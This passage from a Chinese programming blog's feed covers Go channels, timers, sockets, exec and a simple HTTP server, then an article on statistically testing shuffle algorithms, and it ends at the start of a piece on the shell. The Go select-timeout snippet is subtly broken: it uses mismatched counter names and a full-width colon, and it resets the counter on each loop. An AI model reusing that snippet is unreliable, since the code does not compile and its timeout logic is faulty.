    for i := 0; i &lt; 2; i++ {
        select {
        case msg1 := &lt;-c1:
            fmt.Println("received", msg1)
        case msg2 := &lt;-c2:
            fmt.Println("received", msg2)
        }
    }
}</pre>
<p>注意：上面的select是阻塞的，所以，才搞出ugly的for i &lt;2这种东西<strong>。<br>
</strong></p>
<p><strong>Channel select阻塞的Timeout</strong></p>
<p>解决上述那个for循环的问题，一般有两种方法：一种是阻塞但有timeout，一种是无阻塞。我们来看看如果给select设置上timeout的。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="8">    for {
        timeout_cnt := 0
        select {
        case msg1 := &lt;-c1:
            fmt.Println("msg1 received", msg1)
        case msg2 := &lt;-c2:
            fmt.Println("msg2 received", msg2)
        case  &lt;-time.After(time.Second * 30)：
            fmt.Println("Time Out")
            timout_cnt++
        }
        if time_cnt &gt; 3 {
            break
        }
    }
</pre>
<p>上面代码中高亮的代码主要是用来让select返回的，注意 case中的time.After事件。</p>
<p><strong>Channel的无阻塞</strong></p>
<p>好，我们再来看看无阻塞的channel，其实也很简单，就是在select中加入default，如下所示：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="8">    for {
        select {
        case msg1 := &lt;-c1:
            fmt.Println("received", msg1)
        case msg2 := &lt;-c2:
            fmt.Println("received", msg2)
        default: //default会导致无阻塞
            fmt.Println("nothing received!")
            time.Sleep(time.Second)
        }
    }
</pre>
<p><strong>Channel的关闭</strong></p>
<p>关闭Channel可以通知对方内容发送完了，不用再等了。参看下面的例程：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="19,27">package main

import "fmt"
import "time"
import "math/rand"

func main() {

    channel := make(chan string)
    rand.Seed(time.Now().Unix())

    //向channel发送随机个数的message
    go func () {
        cnt := rand.Intn(10)
        fmt.Println("message cnt :", cnt)
        for i:=0; i&lt;cnt; i++{
            channel &lt;- fmt.Sprintf("message-%2d", i)
        }
        close(channel) //关闭Channel
    }()

    var more bool = true
    var msg string
    for more {
        select{
        //channel会返回两个值，一个是内容，一个是还有没有内容
        case msg, more = &lt;- channel:
            if more {
                fmt.Println(msg)
            }else{
                fmt.Println("channel closed!")
            }
        }
    }
}</pre>
<h4>
<span class="ez-toc-section" id="%E5%AE%9A%E6%97%B6%E5%99%A8"></span>定时器<span class="ez-toc-section-end"></span>
</h4>
<p>Go语言中可以使用time.NewTimer或time.NewTicker来设置一个定时器，这个定时器会绑定在你的当前channel中，通过channel的阻塞通知机器来通知你的程序。</p>
<p>下面是一个timer的示例。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="9">package main

import "time"
import "fmt"

func main() {
    timer := time.NewTimer(2*time.Second)

    &lt;- timer.C
    fmt.Println("timer expired!")
}</pre>
<p>上面的例程看起来像一个Sleep，是的，不过Timer是可以Stop的。你需要注意Timer只通知一次。如果你要像C中的Timer能持续通知的话，你需要使用Ticker。下面是Ticker的例程：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="9">package main

import "time"
import "fmt"

func main() {
    ticker := time.NewTicker(time.Second)

    for t := range ticker.C {
        fmt.Println("Tick at", t)
    }
}</pre>
<p>上面的这个ticker会让你程序进入死循环，我们应该放其放在一个goroutine中。下面这个程序结合了timer和ticker</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import "time"
import "fmt"

func main() {

    ticker := time.NewTicker(time.Second)

    go func () {
        for t := range ticker.C {
            fmt.Println(t)
        }
    }()

    //设置一个timer，10钞后停掉ticker
    timer := time.NewTimer(10*time.Second)
    &lt;- timer.C

    ticker.Stop()
    fmt.Println("timer expired!")
}</pre>
<h4>
<span class="ez-toc-section" id="Socket%E7%BC%96%E7%A8%8B"></span>Socket编程<span class="ez-toc-section-end"></span>
</h4>
<p>下面是我尝试的一个Echo Server的Socket代码，感觉还是挺简单的。</p>
<p><strong>Server端</strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="12,19,24,33,36"> 
package main

import (
    "net"
    "fmt"
    "io"
)

const RECV_BUF_LEN = 1024

func main() {
    listener, err := net.Listen("tcp", "0.0.0.0:6666")//侦听在6666端口
    if err != nil {
        panic("error listening:"+err.Error())
    }
    fmt.Println("Starting the server")

    for {
        conn, err := listener.Accept() //接受连接
        if err != nil {
            panic("Error accept:"+err.Error())
        }
        fmt.Println("Accepted the Connection :", conn.RemoteAddr())
        go EchoServer(conn)
    }
}

func EchoServer(conn net.Conn) {
    buf := make([]byte, RECV_BUF_LEN)
    defer conn.Close()

    for {
        n, err := conn.Read(buf);
        switch err {
            case nil:
                conn.Write( buf[0:n] )
            case io.EOF:
                fmt.Printf("Warning: End of data: %s \n", err);
                return
            default:
                fmt.Printf("Error: Reading data : %s \n", err);
                return
        }
     }
}
</pre>
<p><strong>Client端</strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="12,23,31">package main

import (
    "fmt"
    "time"
    "net"
)

const RECV_BUF_LEN = 1024

func main() {
    conn,err := net.Dial("tcp", "127.0.0.1:6666")
    if err != nil {
        panic(err.Error())
    }
    defer conn.Close()

    buf := make([]byte, RECV_BUF_LEN)

    for i := 0; i &lt; 5; i++ {
        //准备要发送的字符串
        msg := fmt.Sprintf("Hello World, %03d", i)
        n, err := conn.Write([]byte(msg))
        if err != nil {
            println("Write Buffer Error:", err.Error())
            break
        }
        fmt.Println(msg)

        //从服务器端收字符串
        n, err = conn.Read(buf)
        if err !=nil {
            println("Read Buffer Error:", err.Error())
            break
        }
        fmt.Println(string(buf[0:n]))

        //等一秒钟
        time.Sleep(time.Second)
    }
}
</pre>
<h4>
<span class="ez-toc-section" id="%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"></span>系统调用<span class="ez-toc-section-end"></span>
</h4>
<p>Go语言那么C，所以，一定会有一些系统调用。Go语言主要是通过两个包完成的。一个是<a href="https://golang.org/pkg/os/" target="_blank" rel="noopener noreferrer">os包</a>，一个是<a href="https://golang.org/pkg/syscall/" target="_blank" rel="noopener noreferrer">syscall包</a>。（注意，链接被墙）</p>
<p>这两个包里提供都是Unix-Like的系统调用，</p>
<ul>
<li>syscall里提供了什么Chroot/Chmod/Chmod/Chdir…，Getenv/Getgid/Getpid/Getgroups/Getpid/Getppid…，还有很多如Inotify/Ptrace/Epoll/Socket/…的系统调用。</li>
</ul>
<ul>
<li>os包里提供的东西不多，主要是一个跨平台的调用。它有三个子包，Exec（运行别的命令）, Signal（捕捉信号）和User（通过uid查name之类的）</li>
</ul>
<p>syscall包的东西我不举例了，大家可以看看《Unix高级环境编程》一书。</p>
<p>os里的取几个例：</p>
<p><strong>环境变量</strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import "os"
import "strings"


func main() {
    os.Setenv("WEB", "https://coolshell.cn") //设置环境变量
    println(os.Getenv("WEB")) //读出来

    for _, env := range os.Environ() { //穷举环境变量
        e := strings.Split(env, "=")
        println(e[0], "=", e[1])
    }
}
</pre>
<h4>
<span class="ez-toc-section" id="%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E8%A1%8C"></span>执行命令行<span class="ez-toc-section-end"></span>
</h4>
<p>下面是一个比较简单的示例</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main
import "os/exec"
import "fmt"
func main() {
    cmd := exec.Command("ping", "127.0.0.1")
    out, err := cmd.Output()
    if err!=nil {
        println("Command Error!", err.Error())
        return
    }
    fmt.Println(string(out))
}</pre>
<p>正规一点的用来处理标准输入和输出的示例如下：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import (
    "strings"
    "bytes"
    "fmt"
    "log"
    "os/exec"
)

func main() {
    cmd := exec.Command("tr", "a-z", "A-Z")
    cmd.Stdin = strings.NewReader("some input")
    var out bytes.Buffer
    cmd.Stdout = &amp;out
    err := cmd.Run()
    if err != nil {
        log.Fatal(err)
    }
    fmt.Printf("in all caps: %q\n", out.String())
}</pre>
<h4>
<span class="ez-toc-section" id="%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0"></span>命令行参数<span class="ez-toc-section-end"></span>
</h4>
<p>Go语言中处理命令行参数很简单：(使用os的Args就可以了)</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="2">func main() {
    args := os.Args
    fmt.Println(args) //带执行文件的
    fmt.Println(args[1:]) //不带执行文件的
}</pre>
<p>在Windows下，如果运行结果如下：</p>
<p><code>C:\Projects\Go&gt;go run args.go aaa bbb ccc ddd<br>
[C:\Users\haoel\AppData\Local\Temp\go-build742679827\command-line-arguments_<br>
obj\a.out.exe aaa bbb ccc ddd]<br>
[aaa bbb ccc ddd]</code></p>
<p>那么，如果我们要搞出一些像 mysql -uRoot -hLocalhost -pPwd 或是像 cc -O3 -Wall -o a a.c 这样的命令行参数我们怎么办？Go提供了一个package叫flag可以容易地做到这一点</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="13">package main
import "flag"
import "fmt"

func main() {

    //第一个参数是“参数名”，第二个是“默认值”，第三个是“说明”。返回的是指针
    host := flag.String("host", "coolshell.cn", "a host name ")
    port := flag.Int("port", 80, "a port number")
    debug := flag.Bool("d", false, "enable/disable debug mode")

    //正式开始Parse命令行参数
    flag.Parse()

    fmt.Println("host:", *host)
    fmt.Println("port:", *port)
    fmt.Println("debug:", *debug)
}</pre>
<p>执行起来会是这个样子：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">#如果没有指定参数名，则使用默认值
$ go run flagtest.go
host: coolshell.cn
port: 80
debug: false

#指定了参数名后的情况
$ go run flagtest.go -host=localhost -port=22 -d
host: localhost
port: 22
debug: true

#用法出错了（如：使用了不支持的参数，参数没有=）
$ go build flagtest.go
$ ./flagtest -debug -host localhost -port=22
flag provided but not defined: -debug
Usage of flagtest:
  -d=false: enable/disable debug mode
  -host="coolshell.cn": a host name
  -port=80: a port number
exit status 2
</pre>
<p>感觉还是挺不错的吧。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84HTTP_Server"></span>一个简单的HTTP Server<span class="ez-toc-section-end"></span>
</h4>
<p>代码胜过千言万语。呵呵。这个小程序让我又找回以前用C写CGI的时光了。（Go的官方文档是《<strong><a href="https://golang.org/doc/articles/wiki/" target="_blank" rel="noopener noreferrer">Writing Web Applications</a></strong>》）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import (
    "fmt"
    "net/http"
    "io/ioutil"
    "path/filepath"
)

const http_root = "/home/haoel/coolshell.cn/"

func main() {
    http.HandleFunc("/", rootHandler)
    http.HandleFunc("/view/", viewHandler)
    http.HandleFunc("/html/", htmlHandler)

    http.ListenAndServe(":8080", nil)
}

//读取一些HTTP的头
func rootHandler(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, "rootHandler: %s\n", r.URL.Path)
    fmt.Fprintf(w, "URL: %s\n", r.URL)
    fmt.Fprintf(w, "Method: %s\n", r.Method)
    fmt.Fprintf(w, "RequestURI: %s\n", r.RequestURI )
    fmt.Fprintf(w, "Proto: %s\n", r.Proto)
    fmt.Fprintf(w, "HOST: %s\n", r.Host) 
}

//特别的URL处理
func viewHandler(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, "viewHandler: %s", r.URL.Path)
}

//一个静态网页的服务示例。（在http_root的html目录下）
func htmlHandler(w http.ResponseWriter, r *http.Request) {
    fmt.Printf("htmlHandler: %s\n", r.URL.Path)
    
    filename := http_root + r.URL.Path
    fileext := filepath.Ext(filename)

    content, err := ioutil.ReadFile(filename)
    if err != nil {
        fmt.Printf("   404 Not Found!\n")
        w.WriteHeader(http.StatusNotFound)
        return
    }
    
    var contype string
    switch fileext {
        case ".html", "htm":
            contype = "text/html"
        case ".css":
            contype = "text/css"
        case ".js":
            contype = "application/javascript"
        case ".png":
            contype = "image/png"
        case ".jpg", ".jpeg":
            contype = "image/jpeg"
        case ".gif":
            contype = "image/gif"
        default: 
            contype = "text/plain"
    }
    fmt.Printf("ext %s, ct = %s\n", fileext, contype)
    
    w.Header().Set("Content-Type", contype)
    fmt.Fprintf(w, "%s", content)
    
}</pre>
<p>Go的功能库有很多，大家自己慢慢看吧。<strong>我再吐个槽——Go的文档真不好读。例子太少了</strong>。</p>
<p>先说这么多吧。这是我周末两天学Go语言学到的东西，写得太仓促了，而且还有一些东西理解不到位，还大家请指正！</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-11-07T08:17:20+08:00</pubDate>
<guid>https://coolshell.cn/articles/8489.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如何测试洗牌程序 ]]></title>
<link>https://coolshell.cn/articles/8593.html</link>
<content><![CDATA[ 
<p>我希望本文有助于你了解测试软件是一件很重要也是一件不简单的事。</p>
<p>我们有一个程序，叫ShuffleArray()，是用来洗牌的，我见过N多千变万化的ShuffleArray()，但是似乎从来没人去想过怎么去测试这个算法。所以，我在面试中我经常会问应聘者如何测试ShuffleArray()，没想到这个问题居然难倒了很多有多年编程经验的人。对于这类的问题，其实，测试程序可能比算法更难写，代码更多。而这个问题正好可以加强一下我在《<a title="我们需要专职的QA吗？" href="https://coolshell.cn/articles/6994.html" target="_blank">我们需要专职的QA吗？</a>》中我所推崇的——开发人员更适合做测试的观点。</p>
<p>我们先来看几个算法（<strong>第一个用递归二分随机抽牌，第二个比较偷机取巧，第三个比较通俗易懂</strong>）</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E9%80%92%E5%BD%92%E4%BA%8C%E5%88%86%E9%9A%8F%E6%9C%BA%E6%8A%BD%E7%89%8C" title="递归二分随机抽牌">递归二分随机抽牌</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%BF%AB%E6%8E%92Hack%E6%B3%95" title="快排Hack法">快排Hack法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%A4%A7%E5%A4%9A%E6%95%B0%E4%BA%BA%E7%9A%84%E5%AE%9E%E7%8E%B0" title="大多数人的实现">大多数人的实现</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%A6%82%E4%BD%95%E6%B5%8B%E8%AF%95" title="如何测试">如何测试</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%AD%A3%E7%A1%AE%E7%9A%84%E7%AE%97%E6%B3%95" title="正确的算法">正确的算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%A6%82%E4%BD%95%E5%86%99%E6%B5%8B%E8%AF%95%E6%A1%88%E4%BE%8B" title="如何写测试案例">如何写测试案例</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E6%B3%A8%E6%84%8F" title="注意">注意</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E9%99%84%E5%BD%95" title="附录">附录</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E9%80%92%E5%BD%92%E4%BA%8C%E5%88%86%E9%9A%8F%E6%9C%BA%E6%8A%BD%E7%89%8C"></span>递归二分随机抽牌<span class="ez-toc-section-end"></span>
</h4>
<p>有一次是有一个朋友做了一个网页版的扑克游戏，他用到的算法就是想模拟平时我们玩牌时用手洗牌的方式，是用递归+二分法，我说这个程序恐怕不对吧。他觉得挺对的，说测试了没有问题。他的程序大致如下（原来的是用Javascript写的，我在这里凭记忆用C复现一下）：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">//递归二分方法
const size_t MAXLEN = 10;
const char TestArr[MAXLEN] = {'A','B','C','D','E','F','G','H','I','J'};

static char RecurArr[MAXLEN]={0};
static int cnt = 0;
void ShuffleArray_Recursive_Tmp(char* arr, int len)
{
    if(cnt &gt; MAXLEN || len &lt;=0){
        return;
    }

    int pos = rand() % len;
    RecurArr[cnt++] = arr[pos];
    if (len==1) return;
    ShuffleArray_Recursive_Tmp(arr, pos);
    ShuffleArray_Recursive_Tmp(arr+pos+1, len-pos-1);
}

void ShuffleArray_Recursive(char* arr, int len)
{
    memset(RecurArr, 0, sizeof(RecurArr));
    cnt=0;
    ShuffleArray_Recursive_Tmp(arr, len);
    memcpy(arr, RecurArr, len);
}

void main()
{
    char temp[MAXLEN]={0};
    for(int i=0; i&lt;5; i++) {
        strncpy(temp, TestArr, MAXLEN);
        ShuffleArray_Recursive((char*)temp, MAXLEN);
    }
}
</pre>
<p><span id="more-8593"></span></p>
<p>随便测试几次，还真像那么回事：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">第一次：D C A B H E G F I J
第二次：A G D B C E F J H I
第三次：A B H F C E D G I J
第四次：J I F B A D C E H G
第五次：F B A D C E H G I J</pre>
<h4>
<span class="ez-toc-section" id="%E5%BF%AB%E6%8E%92Hack%E6%B3%95"></span>快排Hack法<span class="ez-toc-section-end"></span>
</h4>
<p>让我们再看一个hack 快排的洗牌程序（只看算法，省去别的代码）：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int compare( const void *a, const void *b )
{
    return rand()%3-1;
}

void ShuffleArray_Sort(char* arr, int len)
{
    qsort( (void *)arr, (size_t)len, sizeof(char), compare );
}
</pre>
<p>运行个几次，感觉得还像那么回事：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">第一次：H C D J F E A G B I
第二次：B F J D C E I H G A
第三次：C G D E J F B I A H
第四次：H C B J D F G E I A
第五次：D B C F E A I H G J</pre>
<p>看不出有什么破绽。</p>
<h4>
<span class="ez-toc-section" id="%E5%A4%A7%E5%A4%9A%E6%95%B0%E4%BA%BA%E7%9A%84%E5%AE%9E%E7%8E%B0"></span>大多数人的实现<span class="ez-toc-section-end"></span>
</h4>
<p>下面这个算法是大多数人的实现，就是for循环一次，然后随机交换两个数</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void ShuffleArray_General(char* arr, int len)
{
    const int suff_time = len;
    for(int idx=0; idx&lt;suff_time; idx++) {
        int i = rand() % len;
        int j = rand() % len;
        char temp = arr[i];
        arr[i] = arr[j];
        arr[j] = temp;
    }
}</pre>
<p>跑起来也还不错，洗得挺好的。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">第一次：G F C D A J B I H E
第二次：D G J F E I A H C B
第三次：C J E F A D G B H I
第四次：H D C F A E B J I G
第五次：E A J F B I H G D C</pre>
<p>但是上述三个算法哪个的效果更好？好像都是对的。<strong>一般的QA或是程序员很有可能就这样把这个功能Pass了</strong>。但是事情并没有那么简单……</p>
<h4>
<span class="ez-toc-section" id="%E5%A6%82%E4%BD%95%E6%B5%8B%E8%AF%95"></span>如何测试<span class="ez-toc-section-end"></span>
</h4>
<p>在做测试之前，我们还需要了解一下一个基本知识——<strong>PC机上是做不出真随机数的，只能做出伪随机数。真随机数需要硬件支持</strong>。但是不是这样我们就无法测试了呢，不是的。我们依然可以测试。</p>
<p>我们知道，洗牌洗得好不好，主要是看是不是够随机。那么如何测试随机性呢？</p>
<p>试想，我们有个随机函数rand()返回1到10中的一个数，如果够随机的话，每个数返回的概率都应该是一样的，也就是说每个数都应该有10分之1的概率会被返回。</p>
<p>一到概率问题，我们只有一个方法来做测试，那就是用统计的方式。也就是说，你调用rand()函数100次，其中，每个数出现的次数大约都在10次左右。（注意：我用了左右，这说明概率并不是很准确的）不应该有一个数出现了15次以上，另一个在5次以下，要是这样的话，这个函数就是错的。</p>
<p>举一反三，测试洗牌程序也一样，需要通过概率的方式来做统计，是不是每张牌出现在第一个位置的次数都是差不多的。</p>
<p>于是，这样一来上面的程序就可以很容易做测试了。</p>
<p>下面是测试结果（<strong>测试样本1000次——列是每个位置出现的次数，行是各个字符的统计</strong>，出现概率应该是1/10，也就是100次）：</p>
<p><strong>递归随机抽牌的方法</strong></p>
<p>很明显，这个洗牌程序太有问题。算法是错的！</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">     1    2    3    4    5    6    7    8    9    10
----------------------------------------------------
A | 101  283  317  208   65   23    3    0    0    0
B | 101  191  273  239  127   54   12    2    1    0
C | 103  167  141  204  229  115   32    7    2    0
D | 103  103   87  128  242  195  112   26    3    1
E | 104   83   62   67  116  222  228   93   22    3
F |  91   58   34   60   69  141  234  241   65    7
G |  93   43   35   19   44  102  174  274  185   31
H |  94   28   27   27   46   68   94  173  310  133
I | 119   27   11   30   28   49   64   96  262  314
J |  91   17   13   18   34   31   47   88  150  511</pre>
<p><strong>快排Hack法</strong></p>
<p>看看对角线（从左上到右下）上的数据，很离谱！所以，这个算法也是错的。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">      1    2    3    4    5    6    7    8    9    10
-----------------------------------------------------
A |   74  108  123  102   93  198   40   37   52  173
B |  261  170  114   70   49   28   37   76  116   79
C |  112  164  168  117   71   37   62   96  116   57
D |   93   91  119  221  103   66   91   98   78   40
E |   62   60   82   90  290  112   95   98   71   40
F |   46   60   63   76   81  318   56   42   70  188
G |   72   57   68   77   83   39  400  105   55   44
H |   99   79   70   73   87   34  124  317   78   39
I |  127  112  102   90   81   24   57   83  248   76
J |   54   99   91   84   62  144   38   48  116  264</pre>
<p><strong>大多数人的算法</strong></p>
<p>我们再来看看大多数人的算法。还是对角线上的数据有问题，所以，还是错的。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">      1    2    3    4    5    6    7    8    9    10
-----------------------------------------------------
A |  178   98   92   82  101   85   79  105   87   93
B |   88  205   90   94   77   84   93   86  106   77
C |   93   99  185   96   83   87   98   88   82   89
D |  105   85   89  190   92   94  105   73   80   87
E |   97   74   85   88  204   91   80   90  100   91
F |   85   84   90   91   96  178   90   91  105   90
G |   81   84   84  104  102  105  197   75   79   89
H |   84   99  107   86   82   78   92  205   79   88
I |  102   72   88   94   87  103   94   92  187   81
J |   87  100   90   75   76   95   72   95   95  215</pre>
<h4>
<span class="ez-toc-section" id="%E6%AD%A3%E7%A1%AE%E7%9A%84%E7%AE%97%E6%B3%95"></span>正确的算法<span class="ez-toc-section-end"></span>
</h4>
<p>下面，我们来看看性能高且正确的算法—— <a href="https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle" target="_blank">Fisher_Yates算法</a></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void ShuffleArray_Fisher_Yates(char* arr, int len)
{
    int i = len, j;
    char temp;

    if ( i == 0 ) return;
    while ( --i ) {
        j = rand() % (i+1);
        temp = arr[i];
        arr[i] = arr[j];
        arr[j] = temp;
    }
}</pre>
<p>这个算法不难理解，看看测试效果（效果明显比前面的要好）：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">      1    2    3    4    5    6    7    8    9    10
-----------------------------------------------------
A |  107   98   83  115   89  103  105   99   94  107
B |   91  106   90  102   88  100  102   97  112  112
C |  100  107   99  108  101   99   86   99  101  100
D |   96   85  108  101  117  103  102   96  108   84
E |  106   89  102   86   88  107  114  109  100   99
F |  109   96   87   94   98  102  109  101   92  102
G |   94   95  119  110   97  112   89  101   89   94
H |   93  102  102  103  100   89  107  105  101   98
I |   99  110  111  101  102   79  103   89  104  102
J |  105  112   99   99  108  106   95   95   99   82</pre>
<p>但是我们可以看到还是不完美。因为我们使用的rand()是伪随机数，不过已经很不错的。最大的误差在20%左右。</p>
<p>我们再来看看洗牌100万次的统计值，你会看到误差在6%以内了。这个对于伪随机数生成的程序已经很不错了。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">      1       2     3       4      5      6      7      8     9      10
-------------------------------------------------------------------------
A | 100095  99939 100451  99647  99321 100189 100284  99565 100525  99984
B |  99659 100394  99699 100436  99989 100401  99502 100125 100082  99713
C |  99938  99978 100384 100413 100045  99866  99945 100025  99388 100018
D |  99972  99954  99751 100112 100503  99461  99932  99881 100223 100211
E | 100041 100086  99966  99441 100401  99958  99997 100159  99884 100067
F | 100491 100294 100164 100321  99902  99819  99449 100130  99623  99807
G |  99822  99636  99924 100172  99738 100567 100427  99871 100125  99718
H |  99445 100328  99720  99922 100075  99804 100127  99851 100526 100202
I | 100269 100001  99542  99835 100070  99894 100229 100181  99718 100261
J | 100268  99390 100399  99701  99956 100041 100108 100212  99906 100019</pre>
<h4>
<span class="ez-toc-section" id="%E5%A6%82%E4%BD%95%E5%86%99%E6%B5%8B%E8%AF%95%E6%A1%88%E4%BE%8B"></span>如何写测试案例<span class="ez-toc-section-end"></span>
</h4>
<p>测试程序其实很容易写了。就是，设置一个样本大小，做一下统计，然后计算一下误差值是否在可以容忍的范围内。比如：</p>
<ul>
<li>样本：100万次</li>
<li>最大误差：10%以内</li>
<li>平均误差：5%以内 （或者：90%以上的误差要小于5%）</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%B3%A8%E6%84%8F"></span>注意<span class="ez-toc-section-end"></span>
</h4>
<p>其实，以上的测试只是测试了牌在各个位置的概率。这个还不足够好。因为还可能会现在有Patten的情况。如：每次洗牌出来的都是一个循环顺序数组。这完全可以满足我上面的测试条件。但是那明显是错的。<strong>所以，还需要统计每种排列的出现的次数</strong>，看看是不是均匀。但是，<strong>如果这些排列又是以某种规律出现的呢</strong>？看来，这没完没了了。</p>
<p>测试的确是一个很重要，并不简单的事情。谢谢所有参与讨论的人。</p>
<h4>
<span class="ez-toc-section" id="%E9%99%84%E5%BD%95"></span>附录<span class="ez-toc-section-end"></span>
</h4>
<p>之前忘贴了一个模拟我们玩牌洗牌的算法，现补充如下：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void ShuffleArray_Manual(char* arr, int len)
{
    int mid = len / 2;

    for (int n=0; n&lt;5; n++){

        //两手洗牌
        for (int i=1; i&lt;mid; i+=2){
            char tmp = arr[i];
            arr[i] = arr[mid+i];
            arr[mid+i] = tmp;
        }

        //随机切牌
        char *buf = (char*)malloc(sizeof(char)*len);

        for(int j=0; j&lt;5; j++) {
            int start= rand() % (len-1) + 1;
            int numCards= rand()% (len/2) + 1;

            if (start + numCards &gt; len ){
                numCards = len - start;
            }

            memset(buf, 0, len);
            strncpy(buf, arr, start);
            strncpy(arr, arr+start, numCards);
            strncpy(arr+numCards, buf, start);
        }
        free(buf);

    }
}</pre>
<p>我们来看看测试结果：（10万次）效果更好一些，误差在2%以内了。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">      1       2     3       4      5      6      7      8     9      10
-------------------------------------------------------------------------
A |  10002   9998   9924  10006  10048  10200   9939   9812  10080   9991
B |   9939   9962  10118  10007   9974  10037  10149  10052   9761  10001
C |  10054  10100  10050   9961   9856   9996   9853  10016   9928  10186
D |   9851   9939   9852  10076  10208  10003   9974  10052   9992  10053
E |  10009   9915  10050  10037   9923  10094  10078  10059   9880   9955
F |  10151  10115  10113   9919   9844   9896   9891   9904  10225   9942
G |  10001  10116  10097  10030  10061   9993   9891   9922   9889  10000
H |  10075  10033   9866   9857  10170   9854  10062  10078  10056   9949
I |  10045   9864   9879  10066   9930   9919  10085  10104  10095  10013
J |   9873   9958  10051  10041   9986  10008  10078  10001  10094   9910</pre>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-11-20T08:22:07+08:00</pubDate>
<guid>https://coolshell.cn/articles/8593.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 你可能不知道的Shell ]]></title>
<link>https://coolshell.cn/articles/8619.html</link>
<content><![CDATA[ 
<p>Shell也叫做命令行界面，它是*nix操作系统下用户和计算机的交互界面。Shell这个词是指操作系统中提供访问内核服务的程序。</p>
<p>这篇文章向大家介绍Shell一些非广为人知、但却实用有趣的知识，权当品尝shell主食后的甜点吧。</p>
<h4>科普</h4>
<p>先科普几个你可能不知道的事实：</p>
<ul>
<li>Shell几乎是和Unix操作系统一起诞生，第一个Unix Shell是肯·汤普逊（Ken Thompson）以Multics上的Shell为模范在1971年改写而成，并命名Thompson sh。即便是后来流行的bash（shell的一种变体），它的年龄实际上比当前流行的所有的Linux kernel都大，可谓在Linux系统上是先有Shell再有Kernel。</li>
</ul>
<ul>
<li>当前绝大部分*nix和MacOS操作系统里的默认的Shell都是bash，bash由Brian Fox在1987年创造，全称Bourne Again shell ( bash)。</li>
</ul>
<ul>
<li>你或许听说除了bash之外，还有Bourne shell ( sh)，Korn shell ( ksh)，C shell （包括 csh and tcsh），但是你知道这个星球上一共存在着大约50多种不同的shell么？想了解他们，请参考 <a href="https://www.freebsd.org/ports/shells.html" target="_blank" rel="noopener">http://www.freebsd.org/ports/shells.html</a>。</li>
</ul>
<ul>
